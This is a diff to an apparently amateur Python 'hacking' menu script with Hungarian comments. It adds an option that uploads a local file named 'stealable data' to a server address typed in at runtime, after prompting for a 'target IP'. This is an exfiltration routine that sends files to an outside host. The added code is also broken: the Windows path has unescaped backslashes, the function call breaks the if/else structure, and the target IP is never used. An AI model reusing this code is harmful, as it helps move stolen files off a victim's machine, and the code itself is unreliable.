@@ -1,7 +1,7 @@
 import subprocess
 import re
 import time
-
+import requests
 
 def Banner():             
     print("  _______     _______      _______     _      _       _     _     _______     _______                                               ")
@@ -75,6 +75,20 @@ if x == 1:
     track_connected_devices()
     #tenksz jú
 if x == 2:
-    print("Comming soon ")
+    def fajl_feltoltes(ip_cim, fajl_nev):
+        url = input("Add meg a szervered címét: ")  # Módosítsd a szervered IP címére és feltöltési végpontjára
+        files = {'file': open(fajl_nev, 'rb')}  # Az 'file' kulcs a feltöltött fájl neve
+        response = requests.post(url, files=files)
+        
+        if response.status_code == 200:
+            print(f"A fájl feltöltése sikeres volt.")
+        else:
+            print(f"A fájl feltöltése nem sikerült. Státusz kód: {response.status_code}")
+    
+    ip_cim = input("Add meg a célpont ip címét: ")
+    fajl_nev = "C:\Users\Hp\OneDrive\Asztali gép\ellopható adatok.txt"  
+
+fajl_feltoltes(ip_cim, fajl_nev)
+
 else:
     print("Fatal ERROR")    
